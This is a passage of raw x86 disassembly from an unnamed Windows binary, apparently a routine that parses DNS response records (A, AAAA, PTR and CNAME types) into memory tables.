  4060ef:	inc    eax
  4060f0:	add    BYTE PTR [ebx+0x45004057],dl
  4060f6:	push   ebp
  4060f7:	inc    eax
  4060f8:	add    BYTE PTR [edi+0x55],cl
  4060fb:	inc    eax
  4060fc:	add    dh,cl
  4060fe:	push   esi
  4060ff:	inc    eax
  406100:	add    BYTE PTR [esi],cl
  406102:	push   ebp
  406103:	inc    eax
  406104:	add    BYTE PTR [esi+0x57],al
  406107:	inc    eax
  406108:	add    BYTE PTR [ebx+0x59],ch
  40610b:	inc    eax
  40610c:	add    bl,al
  40610e:	push   esp
  40610f:	inc    eax
  406110:	add    BYTE PTR [edx+0x1a004058],dh
  406116:	pop    ecx
  406117:	inc    eax
  406118:	add    al,dl
  40611a:	pop    eax
  40611b:	inc    eax
  40611c:	add    BYTE PTR [ebx],ch
  40611e:	pusha  
  40611f:	inc    eax
  406120:	add    BYTE PTR [ebx],ch
  406122:	pusha  
  406123:	inc    eax
  406124:	add    BYTE PTR [edx-0xfffbfa4],dl
  40612a:	pop    edx
  40612b:	inc    eax
  40612c:	add    BYTE PTR [ebx],ch
  40612e:	pusha  
  40612f:	inc    eax
  406130:	add    BYTE PTR [ebx],ch
  406132:	pusha  
  406133:	inc    eax
  406134:	add    BYTE PTR [ebp+0x2b004059],ch
  40613a:	pusha  
  40613b:	inc    eax
  40613c:	add    BYTE PTR [edi+0x5a],bl
  40613f:	inc    eax
  406140:	add    BYTE PTR [ebx],ch
  406142:	pusha  
  406143:	inc    eax
  406144:	add    BYTE PTR [ebx],ch
  406146:	pusha  
  406147:	inc    eax
  406148:	add    BYTE PTR [ebx],cl
  40614a:	pop    edx
  40614b:	inc    eax
  40614c:	add    ah,cl
  40614e:	int3   
  40614f:	int3   
  406150:	int3   
  406151:	int3   
  406152:	mov    edi,edi
  406154:	push   ebp
  406155:	mov    ebp,esp
  406157:	mov    eax,0x10090
  40615c:	call   0x40d460
  406161:	mov    eax,ds:0x40e004
  406166:	xor    eax,ebp
  406168:	mov    DWORD PTR [ebp-0x8],eax
  40616b:	mov    eax,DWORD PTR [ebp+0x14]
  40616e:	push   ebx
  40616f:	push   esi
  406170:	mov    esi,DWORD PTR [ebp+0x8]
  406173:	push   edi
  406174:	mov    edi,ecx
  406176:	mov    DWORD PTR [ebp-0x1003c],edx
  40617c:	xor    ecx,ecx
  40617e:	mov    DWORD PTR [ebp-0x1001c],eax
  406184:	mov    DWORD PTR [ebp-0x10048],ecx
  40618a:	mov    DWORD PTR [ebp-0x10044],ecx
  406190:	mov    DWORD PTR [ebp-0x10024],ecx
  406196:	mov    DWORD PTR [ebp-0x1002c],ecx
  40619c:	mov    ecx,eax
  40619e:	call   0x40722b
  4061a3:	lea    eax,[ebp-0x10030]
  4061a9:	mov    edx,esi
  4061ab:	push   eax
  4061ac:	push   ecx
  4061ad:	lea    eax,[ebp-0x1000c]
  4061b3:	mov    ecx,edi
  4061b5:	push   eax
  4061b6:	push   DWORD PTR [ebp+0xc]
  4061b9:	call   0x40a960
  4061be:	mov    esi,eax
  4061c0:	test   esi,esi
  4061c2:	je     0x4061e5
  4061c4:	test   DWORD PTR ds:0x40e128,0x80000000
  4061ce:	je     0x4061de
  4061d0:	push   0xca
  4061d5:	push   0x2
  4061d7:	call   0x40b328
  4061dc:	pop    ecx
  4061dd:	pop    ecx
  4061de:	mov    eax,esi
  4061e0:	jmp    0x406c67
  4061e5:	mov    eax,DWORD PTR [ebp-0x10030]
  4061eb:	lea    eax,[ebp+eax*1-0x1000c]
  4061f2:	mov    DWORD PTR [ebp-0x10014],eax
  4061f8:	mov    al,BYTE PTR [ebp-0x10009]
  4061fe:	test   al,0xf
  406200:	je     0x40620d
  406202:	movzx  eax,al
  406205:	and    eax,0xf
  406208:	jmp    0x406c67
  40620d:	push   DWORD PTR [ebp-0x10008]
  406213:	call   DWORD PTR ds:0x413030
  406219:	push   DWORD PTR [ebp-0x10006]
  40621f:	movzx  esi,ax
  406222:	call   DWORD PTR ds:0x413030
  406228:	push   DWORD PTR [ebp-0x10004]
  40622e:	movzx  ebx,ax
  406231:	mov    DWORD PTR [ebp-0x10030],ebx
  406237:	call   DWORD PTR ds:0x413030
  40623d:	push   DWORD PTR [ebp-0x10002]
  406243:	movzx  edi,ax
  406246:	mov    DWORD PTR [ebp-0x10028],edi
  40624c:	call   DWORD PTR ds:0x413030
  406252:	movzx  eax,ax
  406255:	mov    DWORD PTR [ebp-0x10034],eax
  40625b:	test   ebx,ebx
  40625d:	jne    0x40626e
  40625f:	test   edi,edi
  406261:	jne    0x40626e
  406263:	test   eax,eax
  406265:	jne    0x40626e
  406267:	push   0xfffffffe
  406269:	jmp    0x406c66
  40626e:	mov    DWORD PTR [ebp-0x10020],0x411c30
  406278:	lea    edi,[ebp-0x10000]
  40627e:	mov    DWORD PTR [ebp-0x10038],0x201
  406288:	test   esi,esi
  40628a:	jle    0x4062ab
  40628c:	mov    ebx,DWORD PTR [ebp-0x10014]
  406292:	mov    edx,ebx
  406294:	mov    ecx,edi
  406296:	dec    esi
  406297:	call   0x40a099
  40629c:	add    edi,0x4
  40629f:	add    edi,eax
  4062a1:	test   esi,esi
  4062a3:	jg     0x406292
  4062a5:	mov    ebx,DWORD PTR [ebp-0x10030]
  4062ab:	xor    eax,eax
  4062ad:	mov    DWORD PTR [ebp-0x1004c],0x411e40
  4062b7:	mov    DWORD PTR [ebp-0x10018],eax
  4062bd:	push   0x2
  4062bf:	pop    ecx
  4062c0:	test   ebx,ebx
  4062c2:	je     0x4065e8
  4062c8:	cmp    DWORD PTR [ebp+0x18],eax
  4062cb:	jne    0x4062e3
  4062cd:	test   BYTE PTR [ebp-0x1000a],0x4
  4062d4:	jne    0x4062e3
  4062d6:	push   0xcb
  4062db:	push   ecx
  4062dc:	call   0x40b328
  4062e1:	pop    ecx
  4062e2:	pop    ecx
  4062e3:	mov    eax,DWORD PTR [ebp-0x1003c]
  4062e9:	cmp    eax,0x1
  4062ec:	je     0x406344
  4062ee:	cmp    eax,0x1c
  4062f1:	je     0x406344
  4062f3:	cmp    DWORD PTR [ebp+0x10],0x0
  4062f7:	je     0x4062fe
  4062f9:	cmp    eax,0xc
  4062fc:	je     0x406344
  4062fe:	sub    ebx,0x1
  406301:	js     0x40632f
  406303:	mov    esi,DWORD PTR [ebp-0x10014]
  406309:	cmp    edi,esi
  40630b:	jae    0x40632f
  40630d:	push   0x1
  40630f:	call   0x40d391
  406314:	pop    ecx
  406315:	push   eax
  406316:	push   esi
  406317:	lea    edx,[ebp-0x1000c]
  40631d:	mov    ecx,edi
  40631f:	call   0x40524d
  406324:	mov    edi,eax
  406326:	test   edi,edi
  406328:	je     0x40633d
  40632a:	sub    ebx,0x1
  40632d:	jns    0x406309
  40632f:	mov    eax,DWORD PTR [ebp-0x10018]
  406335:	xor    ecx,ecx
  406337:	inc    ecx
  406338:	jmp    0x4065ea
  40633d:	push   0xfffffffd
  40633f:	jmp    0x406c66
  406344:	sub    ebx,0x1
  406347:	mov    esi,DWORD PTR [ebp-0x10014]
  40634d:	js     0x4065cd
  406353:	cmp    edi,esi
  406355:	jae    0x4065dd
  40635b:	push   DWORD PTR [ebp-0x10038]
  406361:	mov    edx,esi
  406363:	lea    ecx,[ebp-0x1000c]
  406369:	push   DWORD PTR [ebp-0x10020]
  40636f:	push   edi
  406370:	call   0x409e47
  406375:	test   eax,eax
  406377:	js     0x40633d
  406379:	add    edi,eax
  40637b:	push   0x2
  40637d:	movzx  eax,BYTE PTR [edi]
  406380:	shl    ax,0x8
  406384:	movzx  esi,ax
  406387:	movzx  eax,BYTE PTR [edi+0x1]
  40638b:	or     esi,eax
  40638d:	pop    eax
  40638e:	add    edi,eax
  406390:	push   0x2
  406392:	movzx  eax,BYTE PTR [edi]
  406395:	shl    ax,0x8
  406399:	movzx  edx,ax
  40639c:	movzx  eax,BYTE PTR [edi+0x1]
  4063a0:	add    edi,0x6
  4063a3:	or     edx,eax
  4063a5:	movzx  eax,BYTE PTR [edi]
  4063a8:	shl    ax,0x8
  4063ac:	movzx  ecx,ax
  4063af:	movzx  eax,BYTE PTR [edi+0x1]
  4063b3:	or     ecx,eax
  4063b5:	pop    eax
  4063b6:	add    edi,eax
  4063b8:	mov    DWORD PTR [ebp-0x10030],ecx
  4063be:	cmp    esi,0x5
  4063c1:	jne    0x40643d
  4063c3:	add    edi,ecx
  4063c5:	mov    ecx,DWORD PTR [ebp-0x1004c]
  4063cb:	cmp    ecx,0x411ec8
  4063d1:	jae    0x406417
  4063d3:	mov    esi,DWORD PTR [ebp-0x10020]
  4063d9:	mov    DWORD PTR [ecx],esi
  4063db:	add    ecx,0x4
  4063de:	mov    DWORD PTR [ebp-0x1004c],ecx
  4063e4:	mov    ecx,esi
  4063e6:	lea    edx,[ecx+0x1]
  4063e9:	mov    al,BYTE PTR [ecx]
  4063eb:	inc    ecx
  4063ec:	test   al,al
  4063ee:	jne    0x4063e9
  4063f0:	sub    ecx,edx
  4063f2:	lea    eax,[ecx+0x1]
  4063f5:	mov    ecx,DWORD PTR [ebp-0x10044]
  4063fb:	add    esi,eax
  4063fd:	mov    DWORD PTR [ebp-0x10020],esi
  406403:	mov    DWORD PTR [ecx*4+0x411ed0],eax
  40640a:	inc    ecx
  40640b:	sub    DWORD PTR [ebp-0x10038],eax
  406411:	mov    DWORD PTR [ebp-0x10044],ecx
  406417:	mov    esi,DWORD PTR [ebp-0x10014]
  40641d:	mov    eax,DWORD PTR [ebp-0x10018]
  406423:	sub    ebx,0x1
  406426:	jns    0x406353
  40642c:	mov    edi,DWORD PTR [ebp-0x1001c]
  406432:	mov    ecx,DWORD PTR [ebp-0x1002c]
  406438:	jmp    0x4065f6
  40643d:	cmp    esi,0xc
  406440:	jne    0x40646e
  406442:	push   DWORD PTR [ebp-0x10038]
  406448:	mov    esi,DWORD PTR [ebp-0x10014]
  40644e:	lea    ecx,[ebp-0x1000c]
  406454:	push   DWORD PTR [ebp-0x10020]
  40645a:	mov    edx,esi
  40645c:	push   edi
  40645d:	call   0x409e47
  406462:	test   eax,eax
  406464:	jns    0x406583
  40646a:	add    edi,eax
  40646c:	jmp    0x40641d
  40646e:	cmp    esi,0x1
  406471:	je     0x40647c
  406473:	cmp    esi,0x1c
  406476:	je     0x40647c
  406478:	add    edi,ecx
  40647a:	jmp    0x406417
  40647c:	mov    eax,DWORD PTR [ebp-0x10018]
  406482:	test   eax,eax
  406484:	je     0x40649c
  406486:	cmp    edx,DWORD PTR [ebp-0x10048]
  40648c:	je     0x406513
  406492:	mov    esi,DWORD PTR [ebp-0x10014]
  406498:	add    edi,ecx
  40649a:	jmp    0x406423
  40649c:	mov    ecx,DWORD PTR [ebp-0x10020]
  4064a2:	mov    DWORD PTR [ebp-0x10048],edx
  4064a8:	lea    edx,[ecx+0x1]
  4064ab:	mov    al,BYTE PTR [ecx]
  4064ad:	inc    ecx
  4064ae:	test   al,al
  4064b0:	jne    0x4064ab
  4064b2:	sub    ecx,edx
  4064b4:	lea    eax,[ecx+0x1]
  4064b7:	xor    ecx,ecx
  4064b9:	mov    edx,eax
  4064bb:	mov    DWORD PTR [ebp-0x10040],eax
  4064c1:	inc    ecx
  4064c2:	call   0x40b3dc
  4064c7:	mov    ecx,DWORD PTR [ebp-0x1001c]
  4064cd:	mov    DWORD PTR [ecx],eax
  4064cf:	test   eax,eax
  4064d1:	je     0x4065b0
  4064d7:	push   DWORD PTR [ebp-0x10040]
  4064dd:	push   DWORD PTR [ebp-0x10020]
  4064e3:	push   eax
  4064e4:	call   0x40d49c
  4064e9:	add    esp,0xc
  4064ec:	mov    ecx,0xdac
  4064f1:	call   0x40c50d
  4064f6:	mov    ecx,DWORD PTR [ebp-0x1001c]
  4064fc:	mov    DWORD PTR [ecx+0x8],eax
  4064ff:	test   eax,eax
  406501:	je     0x4065b0
  406507:	and    DWORD PTR [eax+0x4],0x0
  40650b:	mov    DWORD PTR [eax],0xdac
  406511:	jmp    0x406519
  406513:	mov    ecx,DWORD PTR [ebp-0x1001c]
  406519:	cmp    esi,0x1
  40651c:	jne    0x406540
  40651e:	mov    esi,DWORD PTR [ecx+0x8]
  406521:	mov    edx,DWORD PTR [edi]
  406523:	push   ecx
  406524:	lea    ecx,[ebp-0x1008c]
  40652a:	call   0x40c478
  40652f:	push   ecx
  406530:	push   ecx
  406531:	lea    edx,[ebp-0x1008c]
  406537:	mov    ecx,esi
  406539:	call   0x40c5e5
  40653e:	jmp    0x406551
  406540:	cmp    esi,0x1c
  406543:	jne    0x406551
  406545:	push   ecx
  406546:	push   ecx
  406547:	mov    ecx,DWORD PTR [ecx+0x8]
  40654a:	mov    edx,edi
  40654c:	call   0x40c624
  406551:	mov    eax,DWORD PTR [ebp-0x10024]
  406557:	add    edi,DWORD PTR [ebp-0x10030]
  40655d:	mov    esi,DWORD PTR [ebp-0x10014]
  406563:	cmp    eax,0xdac
  406568:	jge    0x40641d
  40656e:	inc    eax
  40656f:	mov    DWORD PTR [ebp-0x10024],eax
  406575:	xor    eax,eax
  406577:	inc    eax
  406578:	mov    DWORD PTR [ebp-0x10018],eax
  40657e:	jmp    0x406423
  406583:	mov    ebx,DWORD PTR [ebp-0x10020]
  406589:	mov    ecx,ebx
  40658b:	lea    edx,[ecx+0x1]
  40658e:	mov    al,BYTE PTR [ecx]
  406590:	inc    ecx
  406591:	test   al,al
  406593:	jne    0x40658e
  406595:	sub    ecx,edx
  406597:	lea    esi,[ecx+0x1]
  40659a:	xor    ecx,ecx
  40659c:	mov    edx,esi
  40659e:	inc    ecx
  40659f:	call   0x40b3dc
  4065a4:	mov    edi,DWORD PTR [ebp-0x1001c]
  4065aa:	mov    DWORD PTR [edi],eax
  4065ac:	test   eax,eax
  4065ae:	jne    0x4065b7
  4065b0:	push   0xe
  4065b2:	jmp    0x406c66
  4065b7:	push   esi
  4065b8:	push   ebx
  4065b9:	push   eax
  4065ba:	call   0x40d49c
  4065bf:	mov    ecx,DWORD PTR [ebp-0x1002c]
  4065c5:	xor    eax,eax
  4065c7:	add    esp,0xc
  4065ca:	inc    eax
  4065cb:	jmp    0x4065f0
  4065cd:	mov    eax,DWORD PTR [ebp-0x10018]
  4065d3:	mov    ecx,eax
  4065d5:	mov    edi,DWORD PTR [ebp-0x1001c]
  4065db:	jmp    0x4065f6
  4065dd:	mov    eax,DWORD PTR [ebp-0x10018]
  4065e3:	jmp    0x40642c
  4065e8:	mov    ecx,eax
  4065ea:	mov    edi,DWORD PTR [ebp-0x1001c]
  4065f0:	mov    esi,DWORD PTR [ebp-0x10014]
  4065f6:	mov    ebx,DWORD PTR [ebp-0x1003c]
  4065fc:	cmp    ebx,0x1
  4065ff:	je     0x40660b
  406601:	cmp    ebx,0x1c
  406604:	je     0x40660b
  406606:	cmp    ebx,0xc
  406609:	jne    0x406683
  40660b:	test   eax,eax
  40660d:	je     0x406683
  40660f:	mov    ebx,DWORD PTR [ebp-0x10044]
  406615:	test   ebx,ebx
  406617:	jle    0x406678
  406619:	push   0x4
  40661b:	lea    ecx,[ebx+0x1]
  40661e:	pop    edx
  40661f:	call   0x40b3dc
  406624:	mov    DWORD PTR [edi+0x4],eax
  406627:	test   eax,eax
  406629:	je     0x4065b0
  40662b:	xor    esi,esi
  40662d:	test   ebx,ebx
  40662f:	jle    0x406671
  406631:	mov    edx,DWORD PTR [esi*4+0x411ed0]
  406638:	xor    ecx,ecx
  40663a:	inc    ecx
  40663b:	call   0x40b3dc
  406640:	mov    ecx,DWORD PTR [edi+0x4]
  406643:	mov    DWORD PTR [ecx+esi*4],eax
  406646:	mov    eax,DWORD PTR [edi+0x4]
  406649:	cmp    DWORD PTR [eax+esi*4],0x0
  40664d:	je     0x4065b0
  406653:	push   DWORD PTR [esi*4+0x411ed0]
  40665a:	push   DWORD PTR [esi*4+0x411e40]
  406661:	push   DWORD PTR [eax+esi*4]
  406664:	call   0x40d49c
  406669:	add    esp,0xc
  40666c:	inc    esi
  40666d:	cmp    esi,ebx
  40666f:	jl     0x406631
  406671:	mov    eax,DWORD PTR [edi+0x4]
  406674:	and    DWORD PTR [eax+esi*4],0x0
  406678:	and    DWORD PTR [edi+0xc],0x0
  40667c:	xor    eax,eax
  40667e:	jmp    0x406c67
  406683:	test   BYTE PTR [ebp-0x1000a],0x4
  40668a:	mov    edi,DWORD PTR [ebp-0x10028]
  406690:	jne    0x4066b6
  406692:	cmp    ebx,0x1
  406695:	je     0x4066b6
  406697:	cmp    ebx,0x1c
  40669a:	je     0x4066b6
  40669c:	test   edi,edi
  40669e:	jg     0x4066a9
  4066a0:	cmp    DWORD PTR [ebp-0x10034],0x0
  4066a7:	jle    0x4066b6
  4066a9:	test   ecx,ecx
  4066ab:	je     0x4066b6
  4066ad:	push   0xa
  4066af:	call   DWORD PTR ds:0x413168
  4066b5:	pop    ecx
  4066b6:	push   esi
  4066b7:	push   0x2
  4066b9:	pop    eax
  4066ba:	mov    edx,eax
  4066bc:	lea    ecx,[ebp-0x1000c]
  4066c2:	call   0x40b173
  4066c7:	mov    esi,eax
  4066c9:	test   esi,esi
  4066cb:	je     0x40633d
  4066d1:	and    DWORD PTR [ebp-0x10018],0x0
  4066d8:	cmp    ebx,0x1
  4066db:	je     0x40672e
  4066dd:	cmp    ebx,0x1c
  4066e0:	je     0x40672e
  4066e2:	sub    edi,0x1
  4066e5:	mov    DWORD PTR [ebp-0x10028],edi
  4066eb:	js     0x406924
  4066f1:	mov    edi,DWORD PTR [ebp-0x10014]
  4066f7:	cmp    esi,edi
  4066f9:	jae    0x406924
  4066ff:	push   0x1
  406701:	call   0x40d391
  406706:	pop    ecx
  406707:	push   eax
  406708:	push   edi
  406709:	lea    edx,[ebp-0x1000c]
  40670f:	mov    ecx,esi
  406711:	call   0x40524d
  406716:	mov    esi,eax
  406718:	test   esi,esi
  40671a:	je     0x40633d
  406720:	sub    DWORD PTR [ebp-0x10028],0x1
  406727:	jns    0x4066f7
  406729:	jmp    0x406924
  40672e:	sub    edi,0x1
  406731:	mov    DWORD PTR [ebp-0x10028],edi
  406737:	js     0x406924
  40673d:	mov    edi,0x4122e4
  406742:	mov    eax,DWORD PTR [ebp-0x10014]
  406748:	cmp    esi,eax
  40674a:	jae    0x40691e
  406750:	push   DWORD PTR [ebp-0x10038]
  406756:	mov    ebx,DWORD PTR [ebp-0x10020]
  40675c:	lea    ecx,[ebp-0x1000c]
  406762:	push   ebx
  406763:	push   esi
  406764:	mov    edx,eax
  406766:	call   0x409e47
  40676b:	test   eax,eax
  40676d:	js     0x40633d
  406773:	mov    ecx,ebx
  406775:	add    esi,eax
  406777:	lea    edx,[ecx+0x1]
  40677a:	mov    al,BYTE PTR [ecx]
  40677c:	inc    ecx
  40677d:	test   al,al
  40677f:	jne    0x40677a
  406781:	sub    ecx,edx
  406783:	lea    ebx,[ecx+0x1]
  406786:	xor    ecx,ecx
  406788:	mov    edx,ebx
  40678a:	inc    ecx
  40678b:	call   0x40b3dc
  406790:	mov    DWORD PTR [ebp-0x10030],eax
  406796:	test   eax,eax
  406798:	je     0x4065b0
  40679e:	push   ebx
  40679f:	push   DWORD PTR [ebp-0x10020]
  4067a5:	push   eax
  4067a6:	call   0x40d49c
  4067ab:	add    esp,0xc
  4067ae:	mov    edx,esi
  4067b0:	add    esi,0x8
  4067b3:	mov    ebx,esi
  4067b5:	movzx  ecx,BYTE PTR [edx]
  4067b8:	push   0x2
  4067ba:	pop    eax
  4067bb:	add    esi,eax
  4067bd:	shl    cx,0x8
  4067c1:	movzx  eax,BYTE PTR [edx+0x1]
  4067c5:	or     cx,ax
  4067c8:	push   0x2
  4067ca:	pop    eax
  4067cb:	cmp    cx,ax
  4067ce:	je     0x4067e7
  4067d0:	movzx  eax,BYTE PTR [ebx]
  4067d3:	shl    ax,0x8
  4067d7:	movzx  ecx,ax
  4067da:	movzx  eax,BYTE PTR [ebx+0x1]
  4067de:	or     ecx,eax
  4067e0:	add    esi,ecx
  4067e2:	jmp    0x406911
  4067e7:	push   DWORD PTR [ebp-0x10038]
  4067ed:	mov    ebx,DWORD PTR [ebp-0x10020]
  4067f3:	lea    ecx,[ebp-0x1000c]
  4067f9:	mov    edx,DWORD PTR [ebp-0x10014]
  4067ff:	push   ebx
  406800:	push   esi
  406801:	call   0x409e47
  406806:	test   eax,eax
  406808:	js     0x40633d
  40680e:	mov    ecx,ebx
  406810:	add    esi,eax
  406812:	lea    edx,[ecx+0x1]
  406815:	mov    al,BYTE PTR [ecx]
  406817:	inc    ecx
  406818:	test   al,al
  40681a:	jne    0x406815
  40681c:	sub    ecx,edx
  40681e:	lea    ebx,[ecx+0x1]
  406821:	xor    ecx,ecx
  406823:	mov    edx,ebx
  406825:	inc    ecx
  406826:	call   0x40b3dc
  40682b:	mov    DWORD PTR [ebp-0x1002c],eax
  406831:	test   eax,eax
  406833:	je     0x4065b0
  406839:	push   ebx
  40683a:	push   DWORD PTR [ebp-0x10020]
  406840:	push   eax
  406841:	call   0x40d49c
  406846:	mov    eax,DWORD PTR [ebp-0x10018]
  40684c:	add    esp,0xc
  40684f:	mov    edx,DWORD PTR [ebp-0x1002c]
  406855:	xor    ebx,ebx
  406857:	test   eax,eax
  406859:	jle    0x4068d9
  40685b:	mov    eax,0x4122e0
  406860:	mov    DWORD PTR [ebp-0x10024],eax
  406866:	mov    ecx,DWORD PTR [eax]
  406868:	mov    eax,edx
  40686a:	mov    dl,BYTE PTR [eax]
  40686c:	cmp    dl,BYTE PTR [ecx]
  40686e:	mov    BYTE PTR [ebp-0x1000d],dl
  406874:	mov    edx,DWORD PTR [ebp-0x1002c]
  40687a:	jne    0x4068ac
  40687c:	cmp    BYTE PTR [ebp-0x1000d],0x0
  406883:	je     0x4068a8
  406885:	mov    dl,BYTE PTR [eax+0x1]
  406888:	cmp    dl,BYTE PTR [ecx+0x1]
  40688b:	mov    BYTE PTR [ebp-0x1000d],dl
  406891:	mov    edx,DWORD PTR [ebp-0x1002c]
  406897:	jne    0x4068ac
  406899:	add    eax,0x2
  40689c:	add    ecx,0x2
  40689f:	cmp    BYTE PTR [ebp-0x1000d],0x0
  4068a6:	jne    0x40686a
  4068a8:	xor    eax,eax
  4068aa:	jmp    0x4068b1
  4068ac:	sbb    eax,eax
  4068ae:	or     eax,0x1
  4068b1:	test   eax,eax
  4068b3:	je     0x4069a5
  4068b9:	mov    eax,DWORD PTR [ebp-0x10024]
  4068bf:	inc    ebx
  4068c0:	add    eax,0x9c
  4068c5:	mov    DWORD PTR [ebp-0x10024],eax
  4068cb:	cmp    ebx,DWORD PTR [ebp-0x10018]
  4068d1:	jl     0x406866
  4068d3:	mov    eax,DWORD PTR [ebp-0x10018]
  4068d9:	cmp    edi,0x4128fc
  4068df:	jge    0x40691e
  4068e1:	mov    ecx,DWORD PTR [ebp-0x10030]
  4068e7:	mov    DWORD PTR [edi-0x4],edx
  4068ea:	mov    DWORD PTR [edi],ecx
  4068ec:	and    DWORD PTR [edi+0x94],0x0
  4068f3:	and    DWORD PTR [edi+0x8c],0x0
  4068fa:	inc    eax
  4068fb:	mov    DWORD PTR [edi+0x90],0x1
  406905:	add    edi,0x9c
  40690b:	mov    DWORD PTR [ebp-0x10018],eax
  406911:	sub    DWORD PTR [ebp-0x10028],0x1
  406918:	jns    0x406742
  40691e:	mov    ebx,DWORD PTR [ebp-0x1003c]
  406924:	mov    esi,DWORD PTR [ebp-0x10014]
  40692a:	lea    ecx,[ebp-0x1000c]
  406930:	push   esi
  406931:	push   0x3
  406933:	pop    edx
  406934:	call   0x40b173
  406939:	mov    edi,eax
  40693b:	mov    eax,DWORD PTR [ebp-0x10034]
  406941:	test   edi,edi
  406943:	jne    0x40694d
  406945:	test   eax,eax
  406947:	jne    0x40633d
  40694d:	cmp    ebx,0x1
  406950:	je     0x4069df
  406956:	cmp    ebx,0x1c
  406959:	je     0x4069df
  40695f:	sub    eax,0x1
  406962:	mov    DWORD PTR [ebp-0x10034],eax
  406968:	js     0x406b48
  40696e:	cmp    edi,esi
  406970:	jae    0x406b48
  406976:	push   0x1
  406978:	call   0x40d391
  40697d:	pop    ecx
  40697e:	push   eax
  40697f:	push   esi
  406980:	lea    edx,[ebp-0x1000c]
  406986:	mov    ecx,edi
  406988:	call   0x40524d
  40698d:	mov    edi,eax
  40698f:	test   edi,edi
  406991:	je     0x40633d
  406997:	sub    DWORD PTR [ebp-0x10034],0x1
  40699e:	jns    0x40696e
  4069a0:	jmp    0x406b48
  4069a5:	push   edx
  4069a6:	call   DWORD PTR ds:0x413100
  4069ac:	imul   eax,ebx,0x9c
  4069b2:	pop    ecx
  4069b3:	inc    DWORD PTR [eax+0x412374]
  4069b9:	mov    ecx,DWORD PTR [eax+0x412374]
  4069bf:	cmp    ecx,0x23
  4069c2:	ja     0x406911
  4069c8:	imul   eax,ebx,0x27
  4069cb:	add    eax,ecx
  4069cd:	mov    ecx,DWORD PTR [ebp-0x10030]
  4069d3:	mov    DWORD PTR [eax*4+0x4122e0],ecx
  4069da:	jmp    0x406911
  4069df:	sub    eax,0x1
  4069e2:	mov    DWORD PTR [ebp-0x10034],eax
  4069e8:	js     0x406b48
  4069ee:	cmp    edi,esi
  4069f0:	jae    0x406b48
  4069f6:	push   DWORD PTR [ebp-0x10038]
  4069fc:	mov    edx,esi
  4069fe:	lea    ecx,[ebp-0x1000c]
  406a04:	push   DWORD PTR [ebp-0x10020]
  406a0a:	push   edi
  406a0b:	call   0x409e47
  406a10:	test   eax,eax
  406a12:	js     0x406b48
  406a18:	add    edi,eax
  406a1a:	push   0x2
  406a1c:	movzx  eax,BYTE PTR [edi]
  406a1f:	shl    ax,0x8
  406a23:	movzx  ecx,ax
  406a26:	movzx  eax,BYTE PTR [edi+0x1]
  406a2a:	add    edi,0x8
  406a2d:	or     ecx,eax
  406a2f:	movzx  eax,BYTE PTR [edi]
  406a32:	shl    ax,0x8
  406a36:	movzx  ebx,ax
  406a39:	movzx  eax,BYTE PTR [edi+0x1]
  406a3d:	or     ebx,eax
  406a3f:	pop    eax
  406a40:	add    edi,eax
  406a42:	mov    DWORD PTR [ebp-0x10024],ebx
  406a48:	cmp    ecx,0x1
  406a4b:	je     0x406a56
  406a4d:	cmp    ecx,0x1c
  406a50:	jne    0x406b39
  406a56:	xor    esi,esi
  406a58:	cmp    DWORD PTR [ebp-0x10018],esi
  406a5e:	jle    0x406b33
  406a64:	mov    eax,0x412378
  406a69:	mov    edx,DWORD PTR [eax-0x98]
  406a6f:	mov    ecx,DWORD PTR [ebp-0x10020]
  406a75:	mov    bl,BYTE PTR [ecx]
  406a77:	cmp    bl,BYTE PTR [edx]
  406a79:	mov    BYTE PTR [ebp-0x1000d],bl
  406a7f:	mov    ebx,DWORD PTR [ebp-0x10024]
  406a85:	jne    0x406ab7
  406a87:	cmp    BYTE PTR [ebp-0x1000d],0x0
  406a8e:	je     0x406ab3
  406a90:	mov    bl,BYTE PTR [ecx+0x1]
  406a93:	cmp    bl,BYTE PTR [edx+0x1]
  406a96:	mov    BYTE PTR [ebp-0x1000d],bl
  406a9c:	mov    ebx,DWORD PTR [ebp-0x10024]
  406aa2:	jne    0x406ab7
  406aa4:	add    ecx,0x2
  406aa7:	add    edx,0x2
  406aaa:	cmp    BYTE PTR [ebp-0x1000d],0x0
  406ab1:	jne    0x406a75
  406ab3:	xor    ecx,ecx
  406ab5:	jmp    0x406abc
  406ab7:	sbb    ecx,ecx
  406ab9:	or     ecx,0x1
  406abc:	test   ecx,ecx
  406abe:	jne    0x406aca
  406ac0:	inc    DWORD PTR [eax]
  406ac2:	cmp    DWORD PTR [eax],0xdac
  406ac8:	jbe    0x406ada
  406aca:	inc    esi
  406acb:	add    eax,0x9c
  406ad0:	cmp    esi,DWORD PTR [ebp-0x10018]
  406ad6:	jl     0x406a69
  406ad8:	jmp    0x406b33
  406ada:	imul   esi,esi,0x9c
  406ae0:	xor    edx,edx
  406ae2:	push   ecx
  406ae3:	inc    edx
  406ae4:	mov    ecx,DWORD PTR [esi+0x412370]
  406aea:	call   0x40c58b
  406aef:	mov    DWORD PTR [ebp-0x10040],eax
  406af5:	mov    DWORD PTR [esi+0x412370],eax
  406afb:	cmp    ebx,0x4
  406afe:	jne    0x406b23
  406b00:	mov    edx,DWORD PTR [edi]
  406b02:	push   ecx
  406b03:	lea    ecx,[ebp-0x1008c]
  406b09:	call   0x40c478
  406b0e:	push   ecx
  406b0f:	push   ecx
  406b10:	mov    ecx,DWORD PTR [ebp-0x10040]
  406b16:	lea    edx,[ebp-0x1008c]
  406b1c:	call   0x40c5e5
  406b21:	jmp    0x406b33
  406b23:	cmp    ebx,0x10
  406b26:	jne    0x406b33
  406b28:	push   ecx
  406b29:	push   ecx
  406b2a:	mov    edx,edi
  406b2c:	mov    ecx,eax
  406b2e:	call   0x40c624
  406b33:	mov    esi,DWORD PTR [ebp-0x10014]
  406b39:	add    edi,ebx
  406b3b:	sub    DWORD PTR [ebp-0x10034],0x1
  406b42:	jns    0x4069ee
  406b48:	mov    ebx,DWORD PTR [ebp-0x10018]
  406b4e:	test   ebx,ebx
  406b50:	jle    0x406c4b
  406b56:	push   0x4
  406b58:	lea    ecx,[ebx+0x1]
  406b5b:	pop    edx
  406b5c:	call   0x40b3dc
  406b61:	mov    ecx,DWORD PTR [ebp-0x1001c]
  406b67:	mov    DWORD PTR [ecx+0xc],eax
  406b6a:	test   eax,eax
  406b6c:	je     0x4065b0
  406b72:	xor    esi,esi
  406b74:	test   ebx,ebx
  406b76:	mov    DWORD PTR [ebp-0x10024],esi
  406b7c:	mov    ebx,ecx
  406b7e:	jle    0x406c44
  406b84:	mov    edi,0x412374
  406b89:	push   0xc
  406b8b:	xor    ecx,ecx
  406b8d:	pop    edx
  406b8e:	inc    ecx
